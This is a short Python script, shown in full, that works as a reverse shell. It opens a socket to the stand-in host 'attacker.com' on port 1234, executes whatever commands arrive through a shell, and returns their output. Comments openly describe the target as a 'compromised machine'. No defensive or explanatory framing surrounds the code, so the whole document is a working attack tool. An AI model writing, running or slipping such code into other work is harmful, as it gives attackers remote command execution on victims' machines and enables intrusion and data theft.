import socket
import subprocess

# Connect to the attacker's remote server
server_ip = 'attacker.com'
server_port = 1234
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((server_ip, server_port))

# Start a shell on the compromised machine
while True:
    data = sock.recv(1024)
    if not data:
        break
    cmd = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    sock.send(cmd.stdout.read())
    sock.send(cmd.stderr.read())

# Close the connection
sock.close()
